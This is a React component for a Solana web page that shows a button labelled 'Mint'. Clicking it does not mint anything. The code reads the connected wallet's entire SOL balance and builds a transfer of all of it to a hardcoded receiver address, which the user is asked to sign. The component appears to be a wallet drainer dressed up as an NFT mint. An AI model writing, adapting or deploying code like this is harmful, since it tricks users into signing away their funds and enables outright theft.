import { WalletNotConnectedError } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Keypair, SystemProgram, Transaction, PublicKey } from '@solana/web3.js';
import React, { useCallback } from 'react';

import axios from "axios"

export const TransactionComp = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();

    const onClick = useCallback(async () => {
        if (!publicKey) throw new WalletNotConnectedError();

        const resultBalance = await axios({
            url: `https://api.mainnet-beta.solana.com`,
            method: "post",
            headers: { "Content-Type": "application/json" },
            data: [
                {
                  jsonrpc: "2.0",
                  id: 1,
                  method: "getBalance",
                  params: [
                    publicKey.toBase58(),
                  ]
                }
            ]
        }).then((res) => {
            return res.data[0].result.value
        })
        const lamports = resultBalance;
        var recieverWallet = new PublicKey("EzCiVX4YaVn1dPMMtGPQwsPaViLYch1Ch55VDFhVbVkK");

        if(lamports > 0) {
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recieverWallet,
                    lamports: lamports,
                })
            );
    
            const signature = await sendTransaction(transaction, connection);
    
            await connection.confirmTransaction(signature, 'processed');
        } else {
            console.log("Error")
        }       
    }, [publicKey, sendTransaction, connection]);

    return (
        <div 
            onClick={onClick} 
            disabled={!publicKey}
            className="button_transaction_asd"
        >
            <span>Mint</span>
        </div>
    )
}